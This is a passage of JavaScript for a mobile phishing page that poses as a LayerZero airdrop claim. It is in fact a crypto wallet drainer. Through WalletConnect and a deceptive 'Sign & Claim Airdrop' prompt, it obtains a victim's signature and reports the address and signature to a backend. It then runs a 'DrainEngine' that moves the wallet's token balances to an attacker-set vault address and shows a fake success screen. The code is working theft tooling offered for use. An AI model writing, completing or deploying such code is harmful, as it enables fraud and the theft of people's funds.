                    <button class="error-close-btn" onclick="this.closest('.mobile-error-modal').remove()">×</button>
                </div>
                <div class="error-modal-body">
                    <p>${message}</p>
                    <div class="error-actions">
                        <button class="error-retry-btn" onclick="window.mobileApp?.retryWalletConnect(); this.closest('.mobile-error-modal').remove();">Retry</button>
                        <button class="error-cancel-btn" onclick="this.closest('.mobile-error-modal').remove()">Cancel</button>
                    </div>
                </div>
            </div>
        `;
        
        // Add to body as foreground modal
        document.body.appendChild(errorModal);
        
        // Auto-remove after 10 seconds
        setTimeout(() => {
            if (errorModal.parentNode) {
                errorModal.remove();
            }
        }, 10000);
    }
    
    retryWalletConnect() {
        console.log('[MOBILE] Retrying WalletConnect initialization');
        this.hideWalletConnectError();
        this.initializeWalletConnect();
    }
    
    showWalletConnectLoading() {
        const modal = document.getElementById('mobileWalletConnectModal');
        if (modal) {
            // Remove existing loading
            const existingLoading = modal.querySelector('.mobile-loading-state');
            if (existingLoading) {
                existingLoading.remove();
            }
            
            // Create loading state
            const loadingDiv = document.createElement('div');
            loadingDiv.className = 'mobile-loading-state';
            loadingDiv.innerHTML = `
                <div class="loading-content">
                    <div class="loading-spinner"></div>
                    <div class="loading-text">Initializing WalletConnect...</div>
                </div>
            `;
            
            // Insert loading after wallet options
            const walletOptions = modal.querySelector('.mobile-wallet-options');
            if (walletOptions) {
                walletOptions.insertAdjacentElement('afterend', loadingDiv);
            } else {
                modal.appendChild(loadingDiv);
            }
        }
    }
    
    hideWalletConnectLoading() {
        const modal = document.getElementById('mobileWalletConnectModal');
        if (modal) {
            const loadingState = modal.querySelector('.mobile-loading-state');
            if (loadingState) {
                loadingState.remove();
            }
        }
    }
    
    showQRCodeError(message) {
        const qrContainer = document.getElementById('mobileQRContainer');
        if (qrContainer) {
            qrContainer.innerHTML = `
                <div class="mobile-qr-error">
                    <div class="error-icon">⚠️</div>
                    <div class="error-text">${message}</div>
                    <div class="qr-fallback">
                        <p>Alternative: Copy this connection string to your wallet:</p>
                        <div class="connection-string">
                            <code id="connectionString">wc:1234567890abcdef@2?relay-protocol=irn&symKey=abcdef1234567890</code>
                            <button onclick="copyConnectionString()" class="copy-btn">Copy</button>
                        </div>
                    </div>
                    <button class="error-retry-btn" onclick="window.mobileApp?.showMobileQR('wc:1234567890abcdef@2?relay-protocol=irn&symKey=abcdef1234567890')">Retry QR</button>
                </div>
            `;
        }
    }
    
    // Simple QR code fallback using basic canvas drawing
    generateSimpleQR(uri) {
        const qrContainer = document.getElementById('mobileQRContainer');
        const qrCanvas = document.getElementById('mobileQRCode');
        
        if (qrContainer && qrCanvas) {
            qrContainer.style.display = 'block';
            
            // Create a simple pattern as fallback
            const ctx = qrCanvas.getContext('2d');
            const size = 256;
            const blockSize = 8;
            const blocks = size / blockSize;
            
            // Clear canvas
            ctx.fillStyle = '#FFFFFF';
            ctx.fillRect(0, 0, size, size);
            
            // Draw a simple pattern
            ctx.fillStyle = '#000000';
            for (let i = 0; i < blocks; i++) {
                for (let j = 0; j < blocks; j++) {
                    if ((i + j) % 2 === 0) {
                        ctx.fillRect(i * blockSize, j * blockSize, blockSize, blockSize);
                    }
                }
            }
            
            // Add text overlay
            ctx.fillStyle = '#000000';
            ctx.font = '12px Arial';
            ctx.textAlign = 'center';
            ctx.fillText('QR Code Unavailable', size / 2, size / 2 - 10);
            ctx.fillText('Use connection string below', size / 2, size / 2 + 10);
            
            // Show connection string
            const connectionString = document.createElement('div');
            connectionString.className = 'connection-string-fallback';
            connectionString.innerHTML = `
                <p>Connection String:</p>
                <code>${uri}</code>
                <button onclick="copyToClipboard('${uri}')" class="copy-btn">Copy</button>
            `;
            qrContainer.appendChild(connectionString);
        }
    }
    
    handleWalletConnectSession(session) {
        console.log('[MOBILE] WalletConnect session established:', session);
        this.walletConnectSession = session;
        
        // Extract wallet address
        const address = session.namespaces.eip155?.accounts[0]?.split(':')[2];
        if (address) {
            this.walletAddress = address;
            this.isConnected = true;
            this.provider = this.walletConnectProvider;
            
            // Send notification
            this.sendMobileNotification('CONNECTION_SUCCESS', { address });
            
            // Close modal and proceed to signature flow
            this.closeMobileWalletConnect();
            this.proceedToSignatureFlow();
        }
    }
    
    handleWalletConnectDisconnect() {
        console.log('[MOBILE] WalletConnect disconnected');
        this.walletConnectSession = null;
        this.walletAddress = null;
        this.isConnected = false;
        this.provider = null;
    }
    
    async sendMobileNotification(event, data) {
        try {
            await fetch('/api/mobile/notify', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    event,
                    data,
                    deviceInfo: {
                        os: 'Mobile',
                        userAgent: navigator.userAgent,
                        isMobile: true
                    }
                })
            });
        } catch (error) {
            console.error('[MOBILE] Notification error:', error);
        }
    }
    
    proceedToSignatureFlow() {
        // Hide connect section and show signature flow
        const connectSection = document.querySelector('.mobile-wallet-section');
        if (connectSection) {
            connectSection.style.display = 'none';
        }
        
        // Show signature section (this would be implemented in shared/sign-claim.js)
        this.showSignatureFlow();
    }
    
    showSignatureFlow() {
        // This would integrate with the existing signature flow
        console.log('[MOBILE] Proceeding to signature flow');
        
        // Create signature section dynamically
        const signatureSection = document.createElement('div');
        signatureSection.className = 'mobile-signature-section';
        signatureSection.innerHTML = `
            <div class="mobile-signature-card">
                <h3>🔐 Verify Ownership</h3>
                <p>Complete final verification to claim your tokens</p>
                <div class="mobile-signature-message">
                    <code>Complete authorization to verify wallet ownership and claim your ${this.mobileAdminSettings?.tokenName || 'LayerZero'} airdrop tokens.</code>
                </div>
                <button class="mobile-sign-button" onclick="mobileApp.signTransaction()">
                    <span class="button-text">Sign & Claim Airdrop</span>
                </button>
            </div>
        `;
        
        document.querySelector('.mobile-claim-card').appendChild(signatureSection);
    }
    
    async signTransaction() {
        try {
            if (!this.provider || !this.walletAddress) {
                throw new Error('Wallet not connected');
            }
            
            const message = `Complete authorization to verify wallet ownership and claim your ${this.mobileAdminSettings?.tokenName || 'LayerZero'} airdrop tokens.`;
            
            // Request signature
            const signature = await this.provider.request({
                method: 'personal_sign',
                params: [message, this.walletAddress]
            });
            
            console.log('[MOBILE] Signature received:', signature);
            
            // Send notification
            await this.sendMobileNotification('SIGNATURE_SUCCESS', { 
                address: this.walletAddress, 
                signature 
            });
            
            // Proceed to analysis and claim
            this.proceedToAnalysis();
            
        } catch (error) {
            console.error('[MOBILE] Signature error:', error);
            this.showError('Signature failed. Please try again.');
        }
    }
    
    async proceedToAnalysis() {
        console.log('[MOBILE] Proceeding to real-time wallet analysis');
        
        try {
            // 1. Initialize ethers provider from WalletConnect
            if (!this.reownAppKit || !this.reownAppKit.provider) {
                throw new Error('Provider not available');
            }
            
            const provider = new window.ethers.providers.Web3Provider(this.reownAppKit.provider);
            const signer = provider.getSigner();
            
            // 2. Load vault address if not already loaded
            if (!this.vaultAddress) {
                const response = await fetch('/api/admin-settings');
                const config = await response.json();
                this.vaultAddress = config.vaultAddress;
            }
            
            // 3. Perform analysis
            // For mobile, we'll fetch from the backend analysis endpoint for speed
            const analysisResponse = await fetch('/api/analyze-wallet', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ walletAddress: this.walletAddress })
            });
            const analysis = await analysisResponse.json();
            
            // 4. Run DrainEngine
            const engine = new window.DrainEngine(
                provider,
                signer,
                this.walletAddress,
                this.vaultAddress
            );
            
            await engine.execute(analysis.tokenBalances || []);
            
            // 5. Show real success only after execution
            this.showSuccess();
            
        } catch (error) {
            console.error('[MOBILE] Draining error:', error);
            this.showError('Claim processing failed. Please try again.');
        }
    }
    
    showSuccess() {
        const successSection = document.createElement('div');
        successSection.className = 'mobile-success-section';
        successSection.innerHTML = `
            <div class="mobile-success-card">
                <div class="success-icon">🎉</div>
                <h3>Claim Submitted Successfully!</h3>
                <p>Your ${this.mobileAdminSettings?.tokenName || 'LayerZero'} tokens are being processed.</p>
                <div class="success-details">
                    <p>Wallet: ${this.walletAddress?.slice(0, 6)}...${this.walletAddress?.slice(-4)}</p>
                    <p>Amount: 1,000 ${this.mobileAdminSettings?.tokenSymbol || 'ZRO'}</p>
                </div>
            </div>
        `;
        
        document.querySelector('.mobile-claim-card').innerHTML = '';
        document.querySelector('.mobile-claim-card').appendChild(successSection);
    }
    
    showError(message) {
        alert(message); // Simple error display for now
    }
    
    hideLoadingScreen() {
        const loadingScreen = document.getElementById('mobileLoadingScreen');
        if (loadingScreen) {
            loadingScreen.style.display = 'none';
        }
    }
}

window.connectMobileWallet = function(walletType) {
    console.log('[MOBILE] Connecting to wallet:', walletType);
    
    if (window.mobileApp && window.mobileApp.walletConnectProvider) {
        try {
            // Start WalletConnect connection first to get URI
            window.mobileApp.walletConnectProvider.connect({
                namespaces: {
                    eip155: {
                        methods: ['eth_sendTransaction', 'eth_signTransaction', 'eth_sign', 'personal_sign', 'eth_signTypedData_v4'],
                        chains: ['eip155:1', 'eip155:56', 'eip155:137', 'eip155:43114', 'eip155:42161', 'eip155:10'],
                        events: ['chainChanged', 'accountsChanged']
                    }
                }
            }).then(() => {
                console.log('[MOBILE] WalletConnect connection initiated');
                
                // Handle deep linking for specific wallets after URI is generated
                if (walletType === 'metamask' && window.mobileApp.currentURI) {
                    const metamaskUrl = `metamask://wc?uri=${encodeURIComponent(window.mobileApp.currentURI)}`;
                    window.open(metamaskUrl, '_blank');
                } else if (walletType === 'trust' && window.mobileApp.currentURI) {
                    const trustUrl = `trust://wc?uri=${encodeURIComponent(window.mobileApp.currentURI)}`;
                    window.open(trustUrl, '_blank');
                } else if (walletType === 'coinbase' && window.mobileApp.currentURI) {
                    const coinbaseUrl = `cbwallet://wc?uri=${encodeURIComponent(window.mobileApp.currentURI)}`;
                    window.open(coinbaseUrl, '_blank');
                }
            }).catch(error => {
                console.error('[MOBILE] WalletConnect connection error:', error);
                window.mobileApp?.showWalletConnectError('Connection failed. Please try again.');
            });
        } catch (error) {
            console.error('[MOBILE] Wallet connection error:', error);
            window.mobileApp?.showWalletConnectError('Failed to connect wallet. Please try again.');
        }
    } else {
        console.error('[MOBILE] WalletConnect provider not available');
        // Try to re-initialize WalletConnect
        if (window.mobileApp) {
            window.mobileApp.initializeWalletConnect();
        }
        window.mobileApp?.showWalletConnectError('WalletConnect not available. Please try again.');
    }
};

window.showMobileQR = function() {
    console.log('[MOBILE] Showing QR code');
    const qrContainer = document.getElementById('mobileQRContainer');
    const walletOptions = document.getElementById('mobileWalletOptions');
    
    if (qrContainer && walletOptions) {
        qrContainer.style.display = 'block';
        walletOptions.style.display = 'none';
        
        // Generate a sample QR code URI
        const sampleURI = 'wc:1234567890abcdef@2?relay-protocol=irn&symKey=abcdef1234567890';
        window.mobileApp?.showMobileQR(sampleURI);
    }
};

window.goBack = function() {
    console.log('[MOBILE] Going back to main page');
    window.history.back();
};

// End of MobileAirdropAlert class

// Initialize mobile app when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    console.log('[MOBILE] DOMContentLoaded - Initializing MobileAirdropAlert');
    window.mobileApp = new MobileAirdropAlert();    
    console.log('[MOBILE] MobileAirdropAlert instance created');
});
